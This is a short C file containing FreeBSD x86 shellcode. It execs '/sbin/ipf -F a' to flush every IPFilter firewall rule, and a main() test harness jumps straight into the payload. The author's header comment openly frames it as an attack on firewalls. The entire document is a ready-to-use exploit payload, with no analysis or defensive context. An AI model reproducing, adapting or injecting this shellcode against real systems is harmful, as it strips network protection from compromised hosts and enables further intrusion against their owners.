/* nirosys at 0xcd80 dot org
 * * * * * * * * * * * * * * * *
 * FreeBSD execve("ipf -F a"...)
 * shellcode.
 *
 * May firewalls everywhere, tremble.
 * werd.
 * * * * * * * * * * * * * * * */

char shellcode[] = {
   "\x31\xc0\xb0\x66\x50\x68\x6e\x2f"
   "\x69\x70\x68\x2f\x73\x62\x69\x89"
   "\xe3\x68\x2d\x46\x20\x61\x89\xe1"
   "\x31\xd2\x52\x51\x53\x89\xe1\x52"
   "\x51\x53\x50\xb0\x3b\xcd\x80"
};

int main( int argc, char **argv ) {

   void (*foo)() = shellcode;
   printf("Shellcode is %d bytes.\n",strlen(shellcode));
   foo();
}
